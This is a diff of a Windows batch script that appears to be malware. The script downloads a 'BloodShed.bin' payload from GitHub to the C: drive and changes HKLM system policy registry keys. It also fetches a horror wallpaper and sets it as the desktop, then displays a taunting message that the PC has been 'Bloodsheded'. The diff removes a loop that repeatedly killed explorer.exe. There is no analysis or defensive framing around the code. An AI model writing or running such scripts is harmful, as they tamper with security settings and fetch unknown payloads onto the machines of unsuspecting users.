@@ -1,5 +1,5 @@
 @echo off
-color A
+color OA
 
 :init
 curl -L "https://github.com/Syed930s/BloodShed/blob/main/BloodShed.bin" -o C:\bloodshed.bin
@@ -12,9 +12,7 @@ reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Enable
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
 curl -L "https://wallpaperbat.com/down/409151-dark-evil-horror-spooky-creepy-scary-wallpaper-2560x1440" -o C:\DeathNet.png
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\DeathNet.png" /f
-:shan
-taskkkill /f /im explorer.exe
 start explorer.exe
 ECHO Your PC has been Bloodsheded by The Bloodshed...
 echo Don't reboot friend!
-goto shan
+
